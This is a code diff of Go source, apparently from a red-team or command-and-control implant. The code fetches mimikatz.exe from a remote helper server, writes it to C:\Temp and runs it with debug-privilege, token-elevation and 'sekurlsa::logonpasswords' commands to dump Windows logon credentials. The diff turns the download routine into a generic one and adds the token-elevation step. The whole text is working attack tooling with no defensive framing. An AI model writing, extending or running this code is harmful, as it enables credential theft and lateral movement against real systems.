@@ -10,11 +10,10 @@ import (
 )
 
 var TempDir = "C:\\Temp"
-var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"
 
-func GETHELPER() error {
+func GETHELPER(helper string, filePath string) error {
 	jobUuid := os.Args[1]
-	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/mimikatz.exe", nil)
+	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/"+helper, nil)
 	if err != nil {
 		return err
 	}
@@ -32,19 +31,19 @@ func GETHELPER() error {
 	if err != nil {
 		return err
 	}
-	err = WRITEMIMIKATZFILETOTEMPDIR(string(respBody))
+	err = WRITETOFILE(filePath, string(respBody))
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func WRITEMIMIKATZFILETOTEMPDIR(data string) error {
+func WRITETOFILE(filePath string, data string) error {
 	err := os.MkdirAll(TempDir, os.ModePerm)
 	if err != nil {
 		return err
 	}
-	file, err := os.Create(MimikatzFullPath)
+	file, err := os.Create(filePath)
 	if err != nil {
 		return err
 	}
@@ -57,11 +56,12 @@ func WRITEMIMIKATZFILETOTEMPDIR(data string) error {
 }
 
 func RUNMIMIKATZ() {
-	err := GETHELPER()
+	var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"
+	err := GETHELPER("mimikatz.exe", MimikatzFullPath)
 	if err != nil {
 		fmt.Println(err)
 	}
-	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
+	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "token::elevate", "sekurlsa::logonpasswords", "exit").Output()
 	if err != nil {
 		fmt.Println(err)
 	}
